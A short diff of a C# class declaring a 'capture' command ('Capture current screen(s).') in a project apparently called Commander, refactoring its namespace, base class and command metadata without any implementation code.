@@ -1,21 +1,19 @@
-﻿using Commander.Executor;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Commander.Executor;
+using Shared;
+using System.Security.Cryptography;
 
-namespace Commander.Commands.Agent
+namespace Commander.Commands.Agent.EndPoint
 {
-    public class CaptureCommandoptions
+    public class CaptureCommand : EndPointCommand
     {
-        public string output { get; set; }
-    }
-    public class CaptureCommand : EndPointCommand<CaptureCommandoptions>
-    {
-        public override string Category => CommandCategory.Media;
-        public override string Description => "Capture current screen(s)";
+        public override string Description => "Capture current screen(s).";
         public override string Name => "capture";
-        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+        public override CommandId CommandId => CommandId.Capture;
+        public override string Category => CommandCategory.Media;
     }
 }
